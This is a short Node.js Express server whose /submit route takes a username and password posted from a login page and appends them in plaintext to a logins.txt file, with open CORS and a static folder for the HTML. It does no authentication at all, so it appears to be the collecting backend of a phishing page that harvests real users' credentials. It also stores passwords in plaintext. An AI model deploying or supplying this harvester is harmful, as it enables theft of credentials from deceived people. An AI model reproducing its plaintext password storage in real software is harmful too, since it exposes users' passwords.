const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const cors = require('cors');

const app = express();
const PORT = 3000;

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(express.static('public')); // Optional, if you want to serve HTML from public folder

// POST handler for login submission
app.post('/submit', (req, res) => {
    const { username, password } = req.body;
    const loginData = `Username: ${username}, Password: ${password}\n`;

    fs.appendFile('logins.txt', loginData, (err) => {
        if (err) {
            console.error('Error saving data', err);
            return res.status(500).send('Error saving data');
        }
        console.log('Login data saved');
        res.send('Login data saved');
    });
});

// Start the server
app.listen(PORT, () => {
    console.log(`✅ Server running at http://localhost:${PORT}`);
});
